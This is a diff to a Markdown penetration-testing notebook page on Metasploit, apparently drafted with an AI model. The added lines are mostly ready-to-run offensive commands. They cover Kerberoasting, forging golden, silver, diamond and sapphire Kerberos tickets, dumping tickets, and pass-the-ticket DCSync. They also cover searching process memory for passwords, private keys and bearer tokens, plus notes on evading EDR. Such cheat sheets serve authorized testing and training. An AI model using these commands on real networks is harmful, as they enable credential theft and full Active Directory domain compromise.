@@ -1,6 +1,6 @@
 # Metasploit
 
-#Metasploit #msfconsole #Meterpreter #PostExploitation #Payloads #Exploitation
+#Metasploit #msfconsole #Meterpreter #PostExploitation #Payloads #Exploitation #Kerberos #ActiveDirectory #msfvenom #Pivoting
 
 ## What is this?
 
@@ -12,11 +12,12 @@ Open-source exploitation framework — a collection of exploits, auxiliary modul
 
 | Tool | Purpose |
 |---|---|
-| `msfconsole` | Primary interactive interface |
-| `msfvenom` | Standalone payload/shellcode generator |
-| `msfdb` | Database management for scan results and loot |
-| `meterpreter` | In-memory post-exploitation agent |
-| `multi/handler` | Generic listener for staged/stageless payloads |
+| [[Tools/Payloads & Shells/metasploit\|msfconsole]] | Primary interactive interface |
+| [[Tools/Payloads & Shells/msfvenom\|msfvenom]] | Standalone payload/shellcode generator |
+| [[Tools/Payloads & Shells/metasploit\|msfdb]] | Database management for scan results and loot |
+| [[Tools/Payloads & Shells/metasploit\|meterpreter]] | In-memory post-exploitation agent |
+| [[Tools/Payloads & Shells/metasploit\|multi/handler]] | Generic listener for staged/stageless payloads |
+| [[Tools/Scanning/NMAP\|nmap]] | `db_nmap` imports scan results straight into the msf database |
 
 ---
 
@@ -85,7 +86,15 @@ grep -c meterpreter show payloads          # count matches
 # Module path format
 # <No.> <type>/<os>/<service>/<name>
 # e.g.: 679  exploit/windows/ftp/scriptftp_list
+
+# Hierarchical search (6.4+) — also matches module ACTIONS, TARGETS and AKA aliases,
+# so a name you know the tool by finds the module even if it isn't in the module path
+search forge_ticket
+search PetitPotam
+search aka:printnightmare
 ```
+
+> [!tip] If a search comes up empty on 6.4+, the module genuinely isn't there — hierarchical search already covers aliases and actions, so you don't need to guess at alternate spellings the way you did on older versions.
 
 ---
 
@@ -266,7 +275,18 @@ load kiwi
 creds_all                  # dump all creds
 lsa_dump_sam               # SAM hashes
 lsa_dump_secrets           # LSA secrets
+
+# Kerberos tickets on the host (6.4+) — Rubeus klist/dump equivalent
+run post/windows/manage/kerberos_tickets
+
+# Memory search (6.4+, Windows Meterpreter) — pull secrets out of process memory
+# without dropping a dumper to disk
+search_mem -r "password"
+search_mem -r "BEGIN RSA PRIVATE KEY"
+search_mem -p 1234 -r "Authorization: Bearer"    # scope to one PID
 ```
+
+> [!tip] `search_mem` is worth trying when credentials aren't in the SAM/LSA — browser processes, agents, and line-of-business apps routinely hold tokens and passwords in cleartext memory long after login.
 
 ### Persistence & Info Gathering
 
@@ -345,6 +365,58 @@ use auxiliary/scanner/snmp/snmp_login
 # Capture (listener/spoof)
 use auxiliary/server/capture/http_basic
 ```
+
+---
+
+## Kerberos / Active Directory (Metasploit 6.3+)
+
+Metasploit 6.3 added a full Kerberos suite and 6.4 extended it — this covers a lot of what you'd otherwise switch to [[Tools/Lateral Movement/Rubeus|Rubeus]] or [[Tools/Lateral Movement/impacket|impacket]] for, without leaving the framework or dropping a binary on the host.
+
+```bash
+# --- Enumeration / roasting ---
+use auxiliary/gather/kerberos_enumusers      # user enum via AS-REQ (no failed-logon events)
+use auxiliary/gather/get_user_spns           # Kerberoast — request TGS for SPN accounts
+set RHOSTS <dc-ip>
+set DOMAIN corp.local
+set USERNAME <user>
+set PASSWORD <pass>
+run
+
+# --- Ticket forging (golden / silver / diamond / sapphire) ---
+use auxiliary/admin/kerberos/forge_ticket
+set ACTION FORGE_GOLDEN          # or FORGE_SILVER / FORGE_DIAMOND / FORGE_SAPPHIRE
+set DOMAIN corp.local
+set DOMAIN_SID S-1-5-21-...
+set NTHASH <krbtgt-hash>
+set USER Administrator
+run
+# Diamond/Sapphire added in 6.4; tested against Windows Server 2022
+
+# --- Dump tickets from a compromised host (Rubeus klist/dump equivalent) ---
+use post/windows/manage/kerberos_tickets
+set SESSION 1
+run
+
+# --- Pass-the-ticket, then DCSync with it ---
+use auxiliary/gather/windows_secrets_dump
+set RHOSTS <dc-ip>
+set ACTION DOMAIN
+set Krb5Ccname /path/to/ticket.ccache
+run
+```
+
+| Datastore option | Purpose |
+|---|---|
+| `Krb5Ccname` | Path to a `.ccache` ticket — enables pass-the-ticket on supporting modules |
+| `KrbCacheMode` | How msf stores/reuses tickets it obtains (`read-write`, `none`, …) |
+| `DomainControllerRhost` | Explicit DC when it can't be resolved from the domain |
+| `KerberosTicketTrace` | Print AS-REQ/AS-REP/TGS-REQ/TGS-REP as they go over the wire |
+
+> [!tip] `set KerberosTicketTrace true` is the debugging tool to reach for when Kerberos auth "just fails" — it shows the actual request/response exchange instead of a generic error, which usually pinpoints a clock-skew, SPN, or encryption-type mismatch immediately.
+
+> [!note] Kerberos is clock-sensitive — more than ~5 minutes of skew against the DC and every ticket operation fails regardless of correct credentials. Sync first: `sudo ntpdate <dc-ip>` or `sudo rdate -n <dc-ip>`.
+
+> [!note] Ticket forging needs material you must already have — `krbtgt` hash for golden, service-account hash for silver, valid domain creds for diamond/sapphire. See [[Services/Active Directory/Kerberos|Kerberos]] for how each is obtained and which to prefer.
 
 ---
 
@@ -467,6 +539,8 @@ msfvenom --list formats
 
 > [!warning] `shikata_ga_nai` (x86/x64 xor) is heavily signatured — AV vendors have had the decoder stubs for years. For real evasion, pipe msfvenom shellcode into a custom loader (Donut, ScareCrow, Freeze.rs) rather than relying on `-e`. See [[AV & EDR Evasion]].
 
+> [!note] Windows Meterpreter gained **indirect syscalls** in 6.4, which bypasses userland API hooking used by many EDRs. It raises the floor but doesn't make the session invisible — the payload still has to land, and behavioural/ETW-based detection is unaffected.
+
 ---
 
 ## Useful One-Liners
@@ -509,9 +583,13 @@ msfvenom -l encoders
 | Local privesc suggestions | `run post/multi/recon/local_exploit_suggester` |
 | Add pivot route | `route add 192.168.1.0/24 1` |
 | Forward port | `portfwd add -l 8080 -p 80 -r 192.168.1.10` |
+| Forge Kerberos ticket | `use auxiliary/admin/kerberos/forge_ticket` (golden/silver/diamond/sapphire) |
+| Dump host's Kerberos tickets | `run post/windows/manage/kerberos_tickets` |
+| Trace Kerberos exchange | `set KerberosTicketTrace true` |
+| Search process memory (6.4+) | `search_mem -r "password"` |
 
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-31*
+*Model: claude-opus-5*
